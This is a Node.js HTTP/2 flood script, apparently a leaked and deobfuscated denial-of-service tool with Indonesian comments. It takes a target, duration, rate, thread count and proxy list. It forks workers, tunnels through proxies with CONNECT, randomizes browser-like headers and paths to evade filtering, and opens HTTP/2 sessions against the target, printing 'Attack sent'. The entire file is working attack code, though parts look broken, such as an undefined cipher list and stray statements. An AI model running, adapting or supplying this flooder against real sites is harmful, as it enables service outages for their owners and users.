// Powered By > https://obf-io.deobfuscate.io/ and @ChatGPT/@OpenAi
// Leaked By > Axxet

const net = require("net");
const http2 = require("http2");
const tls = require('tls');
const cluster = require("cluster");
const url = require("url");
const fs = require('fs');
const colors = require('colors');
const { HeaderGenerator } = require("header-generator");

tls.DEFAULT_ECDH_CURVE;
process.setMaxListeners(0);  // Mengganti 0x0 dengan 0
require('events').EventEmitter.defaultMaxListeners = 0;  // Mengganti 0x0 dengan 0
process.on("uncaughtException", (error) => {  // Mengganti _0x4ac80a dengan error
    // Penanganan error uncaughtException di sini
});

if (process.argv.length < 7) {
    console.log("Usage: node Flood.js target time rate threads proxyfile".rainbow);
    process.exit();
}

const headers = {};

function randstr(length) {
    let randomString = '';
    const characterSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const characterSetLength = characterSet.length;

    for (let i = 0; i < length; i++) {
        randomString += characterSet.charAt(Math.floor(Math.random() * characterSetLength));
    }

    return randomString;
}

function generateRandomIPAddress() {
    const octet1 = Math.floor(Math.random() * 256);
    const octet2 = Math.floor(Math.random() * 256);
    const octet3 = Math.floor(Math.random() * 256);
    const octet4 = Math.floor(Math.random() * 256);
    return `${octet1}.${octet2}.${octet3}.${octet4}`;
}

const spoofed = generateRandomIPAddress();

const args = {
    'target': process.argv[2],
    'time': parseInt(process.argv[3]),
    'Rate': parseInt(process.argv[4]),
    'threads': parseInt(process.argv[5]),
    'proxyFile': process.argv[6]
};

let headerGenerator = new HeaderGenerator({
    'browsers': [{
        'name': "chrome",
        'minVersion': 50,
        'maxVersion': 110,
        'httpVersion': '2'
    }],
    'devices': ["desktop"],
    'operatingSystems': ["windows"],
    'locales': ["en-US", 'en']
});

let randomHeaders = headerGenerator.getHeaders();

const sig = ['ecdsa_secp256r1_sha256', "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512"];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'];
const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "zu-ZA,zu;q=0.8"];
const encoding_header = ["deflate, gzip, br", "gzip", 'deflate', "compress, gzip", "gzip, identity", '*'];
const control_header = ['no-cache', "max-age=0", 'must-revalidate', "public", "no-transform", "s-maxage=86400", 'only-if-cached', "no-store", "must-revalidate", "proxy-revalidate"];
const refers = ["https://www.youtube.com/", 'https://yandex.ru/'];
const querys = ['', '&', '', '&&', "and", '=', '+', '?'];
const pathts = ["?s=", '/?', "?q=", '*', '', '/', '?true=', '?'];
const platforms = ['Windows', 'Macintosh', "Linux", 'iOS', "Android", "PlayStation 4", "iPhone", "iPad", "Other"];
dest_header = ["audio", "document", 'embed', "empty", "font", "frame", "iframe", "manifest", 'paintworklet', "report", "script", "serviceworker", "sharedworker", "style", "video", 'worker', "xslt"];
mode_header = ['cors', "navigate", "no-cors", 'same-origin', 'websocket'];
site_header = ["cross-site", "same-origin", 'same-site', 'none'];
const uap = ["Mozilla/5.0 (Linux; Android 6.0; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var queryz = querys[Math.floor(Math.random() * querys.length)];
var pathts1 = pathts[Math.floor(Math.random() * pathts.length)];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, 'utf-8').toString().split(/\r?\n/);
var platform = platforms[Math.floor(Math.floor(Math.random() * platforms.length))];
const parsedTarget = url.parse(args.target);
const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))];

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
        console.clear();
    }

    console.log("Attack sent - Methods shared from Villain".gray);
    setTimeout(() => { }, args.threads * 1000); // Mengganti 0x3e8 menjadi 1000 milidetik (1 detik)

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}


class NetSocket {
    constructor() { }

    HTTP(socketOptions, callback) {
        const connectRequest = "CONNECT " + socketOptions.address + ":443 HTTP/1.1\r\nHost: " + socketOptions.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const connectRequestBuffer = Buffer.from(connectRequest);
        const clientSocket = net.connect({
            'host': socketOptions.host,
            'port': socketOptions.port,
            'allowHalfOpen': true,
            'writable': true,
            'readable': true
        });

        const timeoutInMilliseconds = socketOptions.timeout * 10000; // Mengganti 0x2710 ke dalam milidetik
        const keepAliveInterval = 120000; // Mengganti 0x2ee0 ke dalam milidetik

        clientSocket.setTimeout(timeoutInMilliseconds);
        clientSocket.setKeepAlive(true, keepAliveInterval);

        clientSocket.on('connect', () => {
            clientSocket.write(connectRequestBuffer);
        });

        clientSocket.on("data", data => {
            const response = data.toString("utf-8");
            const isHTTP200 = response.includes("HTTP/1.1 200");

            if (!isHTTP200) {
                clientSocket.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }

            return callback(clientSocket, undefined);
        });

        clientSocket.on("timeout", () => {
            clientSocket.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        clientSocket.on('error', error => {
            clientSocket.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}


const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path + pathts1 + randstr(15) + queryz + randstr(15);
headers.origin = parsedTarget.host;
headers[":scheme"] = "https";
headers.accept = randomHeaders.accept;
headers["accept-language"] = randomHeaders["accept-language"];
headers['accept-encoding'] = randomHeaders["accept-encoding"];
headers["cache-control"] = "no-cache";
"max-age=0";
"only-if-cached";
"no-transform";
"must-revalidate";
"no-store";
'public';
"private";
headers["upgrade-insecure-requests"] = '1';
headers["sec-ch-ua"] = uas;
headers["sec-ch-ua-mobile"] = '?0';
headers['sec-ch-ua-platform'] = randomHeaders.platform;
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
;
headers['sec-fetch-mode'] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = '?1';
headers['x-requested-with'] = 'XMLHttpRequest';
headers.pragma = "no-cache";
function runFlooder() {
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    const proxyParts = randomProxy.split(':');
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = uas;
    headers["x-forwarded-proto"] = "https";

    const socketOptions = {
        'host': proxyParts[0],
        'port': parseInt(proxyParts[1]),
        'address': parsedTarget.host + ":443",
        'timeout': 150 // Ganti 0x96 dengan angka sesuai kebutuhan
    };

    Socker.HTTP(socketOptions, (socket, error) => {
        if (error) {
            return;
        }

        socket.setKeepAlive(true, 1000000); // Ganti 0x927c0 dengan angka sesuai kebutuhan
        socket.setNoDelay(true);

        const tlsOptions = {
            'host': parsedTarget.host,
            'port': 443, // Ganti 0x1bb dengan angka sesuai kebutuhan
            'ALPNProtocols': ['h2', "http/1.1", 'spdy/3.1'],
            'followAllRedirects': true,
            'challengeToSolve': 15, // Ganti 0xf dengan angka sesuai kebutuhan
            'maxRedirects': 10, // Ganti 0xa dengan angka sesuai kebutuhan
            'echdCurve': "GREASE:X25519:x25519",
            'ciphers': cipper,
            'secureProtocol': ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            'rejectUnauthorized': false,
            'socket': socket,
            'honorCipherOrder': true,
            'secure': true,
            'servername': parsedTarget.host,
            'sessionTimeout': 5000 // Ganti 0x1388 dengan angka sesuai kebutuhan
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsSocket.setKeepAlive(true, 1000000); // Ganti 0x927c0 dengan angka sesuai kebutuhan

        const http2Options = {
            'protocol': "https:",
            'settings': {
                'headerTableSize': 65536, // Ganti 0x10000 dengan angka sesuai kebutuhan
                'maxConcurrentStreams': 1000, // Ganti 0x3e8 dengan angka sesuai kebutuhan
                'initialWindowSize': 6291456, // Ganti 0x600000 dengan angka sesuai kebutuhan
                'maxHeaderListSize': 262144, // Ganti 0x40000 dengan angka sesuai kebutuhan
                'enablePush': false
            },
            'maxSessionMemory': 64256, // Ganti 0xfa00 dengan angka sesuai kebutuhan
            'maxDeflateDynamicTableSize': 4294967295, // Ganti 0xffffffff dengan angka sesuai kebutuhan
            'createConnection': () => tlsSocket,
            'socket': socket
        };

        const http2Client = http2.connect(parsedTarget.href, http2Options);
        http2Client.settings({
            'headerTableSize': 65536, // Ganti 0x10000 dengan angka sesuai kebutuhan
            'maxConcurrentStreams': 1000, // Ganti 0x3e8 dengan angka sesuai kebutuhan
            'initialWindowSize': 6291456, // Ganti 0x600000 dengan angka sesuai kebutuhan
            'maxHeaderListSize': 262144, // Ganti 0x40000 dengan angka sesuai kebutuhan
            'enablePush': false
        });

        http2Client.on('connect', () => { });
        http2Client.on("close", () => {
            http2Client.destroy();
            socket.destroy();
            return;
        });
        http2Client.on("error", error => {
            http2Client.destroy();
            socket.destroy();
            return;
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000); // Ganti 0x3e8 dengan angka sesuai kebutuhan dan ubah menjadi detik

